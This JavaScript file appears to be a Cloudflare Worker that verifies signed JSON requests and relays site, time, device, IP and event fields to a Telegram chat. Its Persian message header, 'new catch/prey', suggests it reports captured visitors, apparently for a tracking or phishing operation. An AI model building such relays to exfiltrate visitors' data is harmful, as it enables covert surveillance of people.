function hexToBytes(hex) {
  if (!/^[0-9a-f]{64}$/i.test(hex)) return null;
  return new Uint8Array(hex.match(/.{2}/g).map((b) => parseInt(b, 16)));
}
async function verifyHmac(body, signature, secret) {
  const sig = hexToBytes(signature || "");
  if (!sig || !secret) return false;
  const key = await crypto.subtle.importKey("raw", new TextEncoder().encode(secret), { name: "HMAC", hash: "SHA-256" }, false, ["verify"]);
  return crypto.subtle.verify("HMAC", key, sig, new TextEncoder().encode(body));
}
export default {
  async fetch(request, env) {
    if (request.method === "GET") return Response.json({ ok: true, service: "iLive Telegram Relay" });
    if (request.method !== "POST") return new Response("Method Not Allowed", { status: 405 });
    const type = request.headers.get("content-type") || "";
    if (!type.toLowerCase().includes("application/json")) return new Response("JSON required", { status: 415 });
    const length = Number(request.headers.get("content-length") || 0);
    if (length > 8192) return new Response("Payload too large", { status: 413 });
    const raw = await request.text();
    if (raw.length > 8192) return new Response("Payload too large", { status: 413 });
    if (!(await verifyHmac(raw, request.headers.get("X-iLive-Signature"), env.RELAY_SECRET))) return new Response("Unauthorized", { status: 401 });
    let data;
    try { data = JSON.parse(raw); } catch { return new Response("Invalid JSON", { status: 400 }); }
    const clean = (v, max = 200) => String(v ?? "-").replace(/[\u0000-\u001F\u007F]/g, " ").slice(0, max);
    const text = `🐸 | شکار جدید\n\n🌐 سایت: ${clean(data.site,80)}\n🕒 زمان: ${clean(data.time,80)}\n📱 دستگاه: ${clean(data.device,100)}\n🌐 IP: ${clean(data.ip,80)}\n📥 ${clean(data.event,150)}`;
    if (!env.TG_BOT_TOKEN || !env.TG_CHAT_ID) return Response.json({ ok:false, error:"Telegram secrets are not configured" }, { status:500 });
    const controller = new AbortController(); const timer = setTimeout(() => controller.abort(), 8000);
    try {
      const tg = await fetch(`https://api.telegram.org/bot${env.TG_BOT_TOKEN}/sendMessage`, { method:"POST", headers:{"content-type":"application/json"}, body:JSON.stringify({chat_id:env.TG_CHAT_ID,text,disable_web_page_preview:true}), signal:controller.signal });
      return new Response(await tg.text(), { status:tg.status, headers:{"content-type":"application/json; charset=utf-8"} });
    } catch { return Response.json({ok:false,error:"Telegram request failed"},{status:502}); }
    finally { clearTimeout(timer); }
  }
};